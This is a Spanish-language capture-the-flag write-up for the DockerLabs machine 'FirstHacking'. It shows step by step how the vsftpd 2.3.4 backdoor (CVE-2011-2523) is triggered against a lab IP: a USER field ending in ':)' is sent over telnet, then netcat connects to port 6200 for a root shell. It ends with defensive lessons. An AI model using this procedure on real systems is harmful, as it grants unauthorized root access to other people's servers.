# FirstHacking (DockerLabs) — Writeup

Dificultad: muy fácil

Esta es de esas máquinas que existen casi por motivos históricos: no hay enumeración web, ni comentarios HTML con pistas, ni archivos filtrados por FTP anónimo. Hay una sola cosa, y es tan gorda que no necesita compañía: una versión de software con una puerta trasera insertada por terceros en pleno 2011, que sigue funcionando exactamente igual hoy. Cero creatividad requerida, cero escalada de privilegios — solo reconocer un fantasma del pasado y saber cómo invocarlo.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El reto entero se resuelve identificando una única versión de servicio vulnerable y aplicando un exploit ya documentado desde hace más de una década. Es el ejemplo perfecto de por qué mantener el software actualizado no es un consejo genérico de manual, sino literalmente lo único que habría evitado este compromiso.

---

## Paso 0: el objetivo responde

```bash
ping -c 2 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.063 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.057 ms
2 packets transmitted, 2 received, 0% packet loss
```

TTL 64, sistema tipo Unix/Linux. Nada fuera de lo común todavía.

---

## Paso 1: escaneo de puertos, y ahí está el problema

```bash
sudo nmap -p- -sS -sV --min-rate 5000 -n -vvv -Pn -oN escaneo.txt 172.17.0.2
```

| Puerto | Estado | Servicio | Versión |
|---|---|---|---|
| 21/tcp | abierto | FTP | **vsftpd 2.3.4** |

Un único puerto abierto, y basta con leer la versión para que suenen las alarmas si se conoce un poco la historia de este software. **vsftpd 2.3.4** no es una versión vulnerable cualquiera: es la versión cuyo paquete de distribución oficial fue comprometido por un tercero en 2011, insertando una puerta trasera directamente en el código fuente que la gente descargaba de los repositorios oficiales. El caso está catalogado como **CVE-2011-2523**.

---

## Paso 2: entendiendo el backdoor antes de dispararlo

Vale la pena pararse un momento a entender el mecanismo, porque no es un desbordamiento de buffer ni nada que requiera ingeniería inversa: es una condición insertada a propósito por quien manipuló el código.

El backdoor se activa de una forma casi cómica: si el campo `USER` del protocolo FTP contiene una cadena que termina en `:)` (un emoticono clásico de careto sonriente), el servidor interpreta esto como una señal y abre una **shell de comandos con privilegios de root** en el **puerto 6200**, sin pedir ninguna autenticación adicional. Ni contraseña, ni validación, nada. Es la puerta trasera más directa que uno puede encontrarse en un CTF.

---

## Paso 3: activar el backdoor a mano, sin scripts ni Metasploit

Para entender de verdad qué está pasando, mejor hacerlo manualmente con herramientas básicas antes de recurrir a un exploit ya empaquetado.

### 3.1 — Enviar el USER mágico por Telnet

```bash
telnet 172.17.0.2 21
```

```
Trying 172.17.0.2...
Connected to 172.17.0.2.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER hola:)
331 Please specify the password.
PASS lo-que-sea
```

El contenido exacto del usuario y la contraseña es irrelevante — lo único que importa es que el campo `USER` termine en `:)`. El servidor procesa esa cadena y, en segundo plano, activa la puerta trasera.

### 3.2 — Confirmar que el puerto 6200 despertó

Sin cerrar la sesión anterior, en otra terminal:

```bash
nmap -p 6200 172.17.0.2
```

```
PORT     STATE SERVICE
6200/tcp open  lm-x
```

El puerto aparece abierto justo después del envío del `USER`. Antes de esa acción, ese puerto ni siquiera existía en el escaneo inicial — es la prueba de que el backdoor se activó correctamente.

### 3.3 — Conectarse a la shell recién abierta

Repitiendo el paso del `USER` con `:)` y, en otra terminal, conectando de inmediato al puerto:

```bash
nc 172.17.0.2 6200
```

La conexión no muestra ningún prompt visual, pero la shell está activa y esperando comandos. Para confirmarlo:

```bash
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

Root directo, sin pasar por ningún usuario intermedio ni necesitar escalada de privilegios. El backdoor entrega el máximo privilegio posible desde el primer segundo.

---

## Paso 4: la vía rápida, para cuando no hace falta entender el detalle

Todo el proceso anterior puede automatizarse con cualquier script en Python que encadene las tres acciones (conexión FTP, envío del `USER` con `:)`, conexión al puerto 6200) en una sola ejecución. Existen decenas de implementaciones públicas de este exploit específico, dado lo conocido que es el caso. Para un entorno de CTF donde se busca velocidad, cualquiera de esos scripts cumple perfectamente; para entender el fondo del problema, el método manual con telnet y netcat es insustituible.

---

## Resumen técnico

| Campo | Valor |
|---|---|
| Servicio vulnerable | FTP — vsftpd 2.3.4 |
| Identificador | CVE-2011-2523 |
| Vector de explotación | Cadena `:)` en el campo USER |
| Puerto de la shell | 6200/tcp |
| Privilegio obtenido | root directo, sin escalada |
| Herramientas usadas | telnet, nmap, netcat |

---

## Qué falló aquí (y cómo se evita)

1. **Ejecutar una versión de software con un backdoor histórico conocido.** Este no es un fallo de configuración ni un descuido del administrador del laboratorio — es la consecuencia directa de correr una versión de software cuya integridad fue comprometida en su momento en la cadena de distribución oficial. La lección aplicable a cualquier entorno real es simple: mantener los servicios actualizados y verificar los checksums de los paquetes descargados, especialmente tras incidentes de seguridad reportados públicamente.
2. **Ausencia total de segmentación o monitorización de puertos inesperados.** Un puerto como el 6200 apareciendo de la nada tras una conexión FTP debería disparar cualquier sistema de detección de intrusos medianamente decente. En un entorno de producción real, un salto así sería una señal de alarma inmediata.
3. **Cero necesidad de escalada de privilegios** también es, en sí mismo, un síntoma de mala arquitectura: un servicio FTP jamás debería correr con privilegios de root, precisamente para que un fallo como este no se traduzca automáticamente en compromiso total del sistema.

---

## Referencias

- CVE-2011-2523 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2011-2523
- Análisis técnico del backdoor de vsftpd: https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
- DockerLabs: https://dockerlabs.es/
